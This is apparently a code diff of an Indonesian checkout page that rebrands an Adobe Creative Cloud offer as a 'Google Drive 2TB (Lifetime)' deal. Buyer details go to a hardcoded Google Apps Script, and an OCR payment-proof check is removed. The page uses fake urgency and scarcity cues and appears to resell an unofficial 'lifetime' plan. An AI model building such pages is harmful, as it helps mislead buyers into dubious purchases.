                 <article class="relative overflow-hidden rounded-3xl border border-gray-200 bg-white p-5 shadow-[0_18px_60px_-35px_rgba(0,0,0,.25)]">
                   <div class="flex items-start justify-between gap-3">
                     <div class="min-w-0">
                       <div class="inline-flex items-center gap-2 rounded-full bg-slate-900 px-3 py-1 text-[11px] font-semibold text-white">
                         <span class="h-2 w-2 rounded-full bg-emerald-400"></span> Ready Stock
                       </div>
-                      <h3 class="mt-1 text-lg font-extrabold text-gray-900 leading-tight">Adobe Creative Cloud</h3>
+                      <h3 class="mt-1 text-lg font-extrabold text-gray-900 leading-tight">Google Drive 2TB (Lifetime)</h3>
                       <p class="mt-1 text-xs text-gray-500">Sisa promo terbatas hari ini</p>
                     </div>
-                    <span class="shrink-0 rounded-2xl bg-black px-3 py-1 text-[11px] font-bold text-white">Resmi</span>
+                    <span class="shrink-0 rounded-2xl bg-black px-3 py-1 text-[11px] font-bold text-white">Best</span>
                   </div>
 
-                  <!-- Package Switcher -->
-                  <div class="mt-4 bg-gray-100/80 p-1 rounded-xl flex">
-                      <button type="button" onclick="switchPackage('monthly')" class="${btnClassBase} ${isMonthly ? btnClassActive : btnClassInactive}">
-                          1 Bulan
-                      </button>
-                      <button type="button" onclick="switchPackage('yearly')" class="${btnClassBase} ${isYearly ? btnClassActive : btnClassInactive}">
-                          1 Tahun (Hemat)
-                      </button>
-                  </div>
-
-                  <div class="mt-4 rounded-2xl bg-red-50 p-4 ring-1 ring-red-100">
+                  <div class="mt-4 rounded-2xl bg-blue-50 p-4 ring-1 ring-blue-100">
                     <div class="flex items-center justify-between">
-                      <p class="text-xs text-gray-500">Harga ${pkg.name}</p>
-                      <p class="text-xs font-semibold text-red-600">Berakhir 23:59</p>
+                      <p class="text-xs text-gray-500">Harga sekarang</p>
+                      <p class="text-xs font-semibold text-blue-600">Berakhir 23:59</p>
                     </div>
 
                     <div class="mt-1 flex items-end justify-between">
-                      <p class="text-3xl font-extrabold tracking-tight text-gray-900">${formatCurrency(pkg.price)}</p>
-                      <p class="text-[11px] font-semibold text-gray-400 line-through">${formatCurrency(pkg.normalPrice)}</p>
+                      <p class="text-3xl font-extrabold tracking-tight text-gray-900">${formatCurrency(lifetime.price)}</p>
+                      <p class="text-[11px] font-semibold text-gray-400 line-through">${formatCurrency(lifetime.normalPrice)}</p>
                     </div>
 
                     <div class="mt-3">
@@ -1014,14 +945,14 @@
                         <span class="font-semibold text-gray-800">${quota}% tersisa</span>
                       </div>
                       <div class="mt-2 h-2 overflow-hidden rounded-full bg-gray-200">
-                        <div class="h-full rounded-full bg-gradient-to-r from-red-500 to-red-600" style="width: ${quota}%"></div>
+                        <div class="h-full rounded-full bg-gradient-to-r from-blue-500 to-blue-600" style="width: ${quota}%"></div>
                       </div>
                     </div>
                   </div>
 
                   <!-- CTA -->
                   <div class="mt-4 flex gap-2">
-                    <button type="button" onclick="document.getElementById('nama').focus()" class="h-12 flex-1 rounded-2xl bg-[#E31E24] px-5 text-sm font-semibold text-white shadow-lg shadow-red-600/20 active:scale-[.99] hover:bg-[#C21B20] transition-colors">
+                    <button type="button" onclick="document.getElementById('nama').focus()" class="h-12 flex-1 rounded-2xl bg-[#1a73e8] px-5 text-sm font-semibold text-white shadow-lg shadow-blue-600/20 active:scale-[.99] hover:bg-[#1557b0] transition-colors">
                       Ambil Promo
                     </button>
 
@@ -1038,16 +969,12 @@
                 </article>
             `;
             
+            // Init Sheet Logic after render
             initSheetLogic();
         }
 
-        // Global switcher function
-        window.switchPackage = function(pkgId) {
-            if (currentPackage === pkgId) return;
-            selectPackage(pkgId); // Updates state and re-renders
-        };
-
         let sheetInitialized = false;
+
         function initSheetLogic() {
             const sheet = document.getElementById("sheet");
             if(!sheet) return;
@@ -1075,6 +1002,7 @@
             const btnClose = document.getElementById("btnClose");
             const btnOk = document.getElementById("btnOk");
             
+            // Populate features
             const listContainer = document.getElementById("sheet-features-list");
             if(listContainer && typeof fullFeaturesList !== 'undefined') {
                 listContainer.innerHTML = fullFeaturesList.map(feat => `
@@ -1151,16 +1079,6 @@
             document.getElementById('imageModal').classList.add('active');
         }
 
-        function selectPackage(pkgId) {
-            currentPackage = pkgId;
-            document.getElementById('selectedPackage').value = pkgId;
-            
-            // Re-render the package cards to update the 'selected' state visually
-            renderPackageCards();
-            
-            updateTotalPrice();
-        }
-
         function selectPayment(paymentId) {
             currentPayment = paymentId;
             document.getElementById('selectedPayment').value = paymentId;
@@ -1206,7 +1124,7 @@
                 return { valid: false, msg: 'Email tidak valid', element: emailInput };
             }
 
-            const domain = email.split('@')[1];
+            const domain = email.split('@')[1].toLowerCase();
             if (!allowedEmailDomains.includes(domain)) {
                 return { valid: false, msg: 'Domain email tidak diizinkan. Harap gunakan email pribadi.', element: emailInput };
             }
@@ -1236,8 +1154,8 @@
             const totalPrice = pkg.price + uniqueCode;
             const now = new Date();
             const rL = () => "ABCDEFGHIJKLMNOPQRSTUVWXYZ".charAt(Math.floor(Math.random() * 26));
-            const rD = () => Math.floor(Math.random() * 10);
-            const paymentId = `INV-ADOBE-${String(now.getFullYear()).slice(-2)}${String(now.getMonth() + 1).padStart(2, '0')}${String(now.getDate()).padStart(2, '0')}-${rL()}${rD()}${rL()}${rD()}`;
+            const rN = () => Math.floor(Math.random() * 10);
+            const paymentId = `INV-GDRIVE-${String(now.getFullYear()).slice(-2)}${String(now.getMonth() + 1).padStart(2, '0')}${String(now.getDate()).padStart(2, '0')}-${rL()}${rN()}${rL()}${rN()}`;
             
             // Prepare Object for Google Script
             const dataToSend = {
@@ -1253,8 +1171,10 @@
             };
             
             // Send to Google Script
+            const scriptURL = 'https://script.google.com/macros/s/AKfycbySaAB2WT0D59UlLyZcXliWvNURCnHcRrqz5P8C2LCQbVdk0hn3Qkl1glGiLJSql_Wh/exec';
+
             try {
-                await fetch(SCRIPT_URL, {
+                await fetch(scriptURL, {
                     method: 'POST',
                     mode: 'no-cors',
                     headers: { 'Content-Type': 'application/json' },
@@ -1283,8 +1203,7 @@
                 nama: data.nama,
                 whatsapp: data.whatsapp,
                 email: data.email,
-                price: pkgDetails.price,
-                sheetName: data.sheetName
+                price: pkgDetails.price
             };
 
             // Hide Form, Show Payment
@@ -1303,7 +1222,7 @@
             // Populate invoice summary
             document.getElementById('invoice-details-summary').innerHTML = `
                 <span>No. Invoice: <strong>${data.idPembayaran}</strong></span>
-                <a href="#" onclick="showDetailsModal(event)" class="font-semibold text-red-600">Lihat detail</a>
+                <a href="#" onclick="showDetailsModal(event)" class="font-semibold text-blue-600">Lihat detail</a>
             `;
 
             // Generate WA Link
@@ -1549,7 +1468,7 @@
                                 <p class="font-medium">${whatsapp}</p>
                             </div>
                              <div>
-                                <p class="text-gray-500 text-xs mb-0.5">Email Adobe ID</p>
+                                <p class="text-gray-500 text-xs mb-0.5">Email Gmail</p>
                                 <p class="font-medium">${details.email}</p>
                             </div>
                         </div>
@@ -1565,145 +1484,6 @@
             
             modalContent.innerHTML = getDetailsModalHTML(currentOrderDetails);
             modal.classList.add('active');
-        }
-
-        // --- OCR & PAYMENT VERIFICATION LOGIC ---
-        
-        let selectedFile = null;
-
-        async function handleImageUpload(event) {
-            const file = event.target.files[0];
-            if (file) {
-                selectedFile = file;
-                // Auto start verification
-                await verifyPaymentWithOCR();
-            }
-        }
-
-        async function verifyPaymentWithOCR() {
-            if (!selectedFile) return;
-
-            const scanningState = document.getElementById('ocr-scanning-state');
-            const initialState = document.getElementById('ocr-initial-state');
-
-            // UI: Scanning
-            // Keep initialState visible to maintain container height/width
-            // initialState.classList.add('hidden'); 
-            scanningState.classList.remove('hidden');
-            
-            // Timeout safety
-            let worker = null;
-            const timeoutId = setTimeout(() => {
-                if (worker) worker.terminate();
-                showOCRFailure("Waktu habis. Silakan coba lagi.");
-            }, 60000); 
-
-            try {
-                if (typeof Tesseract === 'undefined') throw new Error("Library missing");
-
-                // Initialize Tesseract (Silent Mode)
-                worker = await Tesseract.createWorker("eng", 1, {
-                    logger: () => {} // Disable console logs for pro look
-                });
-                
-                const { data: { text } } = await worker.recognize(selectedFile);
-                await worker.terminate();
-                worker = null;
-                clearTimeout(timeoutId);
-
-                // --- MATCHING ---
-                let cleanedText = text
-                    .replace(/O|o/g, '0')
-                    .replace(/I|l/g, '1')
-                    .replace(/S|s/g, '5')
-                    .replace(/B/g, '8');
-
-                const digitsOnly = cleanedText.replace(/[^0-9]/g, '');
-                const expectedAmount = currentOrderDetails.totalPrice.toString();
-                
-                if (digitsOnly.includes(expectedAmount)) {
-                    onPaymentSuccess();
-                } else {
-                    // Professional Failure Message
-                    showOCRFailure("Bukti pembayaran tidak valid. Silakan upload kembali atau verifikasi manual via WhatsApp.");
-                }
-
-            } catch (error) {
-                clearTimeout(timeoutId);
-                console.error(error); 
-                showOCRFailure("Gagal memproses gambar. Pastikan format gambar benar (JPG/PNG) dan ukuran tidak terlalu besar.");
-            } finally {
-                if (worker) await worker.terminate();
-            }
-        }
-
-        function showOCRFailure(msg) {
-            // Reset Box UI
-            const scanningState = document.getElementById('ocr-scanning-state');
-            const initialState = document.getElementById('ocr-initial-state');
-            
-            scanningState.classList.add('hidden');
-            initialState.classList.remove('hidden'); // Return to upload state
-            
-            // Show Failure Modal
-            document.getElementById('ocrFailureMsg').innerText = msg;
-            document.getElementById('ocrFailureModal').classList.add('active');
-        }
-        
-        function retryOCRUpload() {
-            closeModal('ocrFailureModal');
-            document.getElementById('payment-proof-input').click();
-        }
-
-        function onPaymentSuccess() {
-             const scanningState = document.getElementById('ocr-scanning-state');
-             const initialState = document.getElementById('ocr-initial-state');
-             const container = document.getElementById('ocr-container');
-
-             // Stop spinner but don't show result inline
-             scanningState.classList.add('hidden');
-             
-             // Show success styling on the box
-             container.classList.add('border-green-500', 'bg-green-50');
-             container.classList.remove('border-blue-200', 'hover:bg-blue-50', 'cursor-pointer');
-             container.onclick = null; 
-             
-             // Change initial state icon/text to success statically (optional, but clean)
-             initialState.innerHTML = `
-                <div class="w-16 h-16 bg-green-100 text-green-600 rounded-full flex items-center justify-center mx-auto mb-3">
-                    <i class="fas fa-check"></i>
-                </div>
-                <p class="text-sm font-bold text-green-700">Bukti Terkirim</p>
-             `;
-             initialState.classList.remove('hidden');
-
-             // Show Success Modal
-             document.getElementById('ocrSuccessModal').classList.add('active');
-             
-             // Send confirmation to backend
-             sendPaymentConfirmationToBackend();
-        }
-
-        async function sendPaymentConfirmationToBackend() {
-            const payload = {
-                action: 'confirm_payment',
-                idPembayaran: String(currentOrderDetails.paymentId).trim(),
-                sheetName: currentOrderDetails.sheetName
-            };
-
-            console.log("Sending confirmation payload:", payload);
-
-            try {
-                 await fetch(SCRIPT_URL, {
-                    method: 'POST',
-                    mode: 'no-cors',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(payload)
-                });
-                console.log("Confirmation sent to backend (no-cors mode)");
-            } catch (e) {
-                console.error("Failed to send confirmation", e);
-            }
         }
 
     </script>
